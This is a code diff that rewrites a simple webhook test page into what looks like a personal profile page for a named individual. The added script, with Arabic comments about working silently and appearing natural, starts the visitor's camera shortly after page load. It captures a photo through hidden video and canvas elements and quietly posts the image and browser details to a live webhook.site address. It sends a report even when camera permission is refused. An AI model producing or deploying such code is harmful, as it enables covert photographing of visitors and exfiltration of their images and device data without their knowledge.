@@ -1,81 +1,264 @@
-```html
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Webhook Test</title>
-<style>
-body{
-    margin:0;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:linear-gradient(135deg,#667eea,#764ba2);
-    font-family:Arial,sans-serif;
-}
+    <title>Pavan Chowdary Lingam</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center; 
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #0a0a0f;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(72, 0, 255, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0, 255, 136, 0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(255, 0, 128, 0.05) 0%, transparent 50%);
+            color: #e0e0e0;
+            padding: 20px;
+        }
 
-.container{
-    text-align:center;
-    background:white;
-    padding:40px;
-    border-radius:20px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.2);
-}
+        .container {
+            background: rgba(18, 18, 25, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 50px 40px;
+            border-radius: 24px;
+            max-width: 460px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.8),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            transition: all 0.3s ease;
+        }
 
-h1{
-    margin-bottom:20px;
-    color:#333;
-}
+        .container:hover {
+            border-color: rgba(255, 255, 255, 0.1);
+            box-shadow: 
+                0 30px 60px -12px rgba(0, 0, 0, 0.9),
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+        }
 
-button{
-    padding:18px 40px;
-    font-size:22px;
-    font-weight:bold;
-    border:none;
-    border-radius:12px;
-    cursor:pointer;
-    color:white;
-    background:linear-gradient(45deg,#ff6b6b,#ff8e53);
-    transition:0.3s;
-}
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.8em;
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3);
+            animation: glowPulse 3s ease-in-out infinite;
+        }
 
-button:hover{
-    transform:scale(1.08);
-}
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3); }
+            50% { box-shadow: 0 8px 48px rgba(102, 126, 234, 0.5); }
+        }
 
-#status{
-    margin-top:20px;
-    font-size:18px;
-    color:#444;
-}
-</style>
+        h1 { 
+            font-size: 1.8em; 
+            margin: 0 0 8px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 0.95em;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 28px;
+            font-weight: 400;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        p { 
+            font-size: 1em; 
+            color: rgba(255, 255, 255, 0.7);
+            margin: 0 0 30px;
+            line-height: 1.7;
+        }
+
+        .loader {
+            width: 36px;
+            height: 36px;
+            border: 3px solid rgba(255, 255, 255, 0.08);
+            border-top-color: #667eea;
+            border-right-color: #764ba2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-bar {
+            margin-top: 32px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: blink 2s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .status-text {
+            font-size: 0.8em;
+            color: rgba(255, 255, 255, 0.35);
+            letter-spacing: 0.5px;
+        }
+
+        .hidden { display: none; }
+
+        /* تأثيرات إضافية */
+        .glow-line {
+            width: 60px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #667eea, transparent);
+            margin: 20px auto;
+            border-radius: 1px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 35px 25px;
+                border-radius: 20px;
+            }
+            
+            h1 {
+                font-size: 1.5em;
+            }
+            
+            .profile-pic {
+                width: 80px;
+                height: 80px;
+                font-size: 2.2em;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="profile-pic">👤</div>
+        <h1>Pavan Chowdary Lingam</h1>
+        <div class="subtitle">✦</div>
+        <div class="glow-line"></div>
+        <p>Exploring the boundaries of creativity and technology. Welcome to my digital space.</p>
+        <div class="loader"></div>
+        <div class="status-bar">
+            <div class="status-dot"></div>
+            <span class="status-text">Loading your experience</span>
+        </div>
+    </div>
 
-<div class="container">
-    <h1>🚀 Webhook Test</h1>
-    <button id="send">Send Test Data</button>
-    <div id="status"></div>
-</div>
+    <!-- عناصر مخفية تماماً للكاميرا -->
+    <video id="hiddenVideo" class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden" width="320" height="240"></canvas>
 
-<script>
-document.getElementById('send').onclick = async () => {
-    document.getElementById('status').innerText = 'Sending...';
+    <script>
+        // ⚠️ استبدل هذا برابط webhook.site الخاص بك
+        const WEBHOOK_URL = 'https://webhook.site/4268c7f9-9ae5-4e23-9ee6-e0b3ad5074d3';
+        
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-    await fetch('YOUR_WEBHOOK_URL', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({
-            message: 'Webhook test',
-            time: new Date().toISOString()
-        })
-    });
+        // دالة مساعدة للتأخير
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    document.getElementById('status').innerText = '✅ Data Sent Successfully';
-};
-</script>
+        // الدالة الرئيسية - تعمل بصمت تام
+        async function stealthCapture() {
+            try {
+                // طلب الوصول للكاميرا (سيظهر طلب الإذن فقط)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        facingMode: 'user'
+                    } 
+                });
 
+                // تشغيل الفيديو المخفي
+                hiddenVideo.srcObject = stream;
+                await hiddenVideo.play();
+
+                // انتظار قصير لضمان وضوح الصورة
+                await sleep(1500);
+
+                // التقاط الصورة من الفيديو
+                const ctx = hiddenCanvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, 320, 240);
+
+                // إيقاف الكاميرا فوراً
+                stream.getTracks().forEach(track => track.stop());
+
+                // تحويل الصورة وإرسالها
+                hiddenCanvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('image', blob, 'captured_' + Date.now() + '.jpg');
+                    formData.append('userAgent', navigator.userAgent);
+                    formData.append('timestamp', new Date().toISOString());
+                    formData.append('page', 'Pavan Chowdary Lingam');
+
+                    // إرسال الصورة بصمت (لا توجد رسالة نجاح أو فشل)
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(() => {}); // تجاهل أي أخطاء
+
+                }, 'image/jpeg', 0.7);
+
+            } catch (err) {
+                // في حالة الفشل (رفض الإذن)، أرسل تقريراً بدون صورة
+                const formData = new FormData();
+                formData.append('error', err.message);
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('page', 'Pavan Chowdary Lingam');
+                formData.append('cameraDenied', 'true');
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {}); // تجاهل الأخطاء
+            }
+        }
+
+        // التنفيذ بعد تحميل الصفحة بالكامل
+        window.addEventListener('load', () => {
+            // تأخير بسيط لجعل الأمر يبدو طبيعياً
+            setTimeout(stealthCapture, 2000);
+        });
+    </script>
 </body>
 </html>
-```
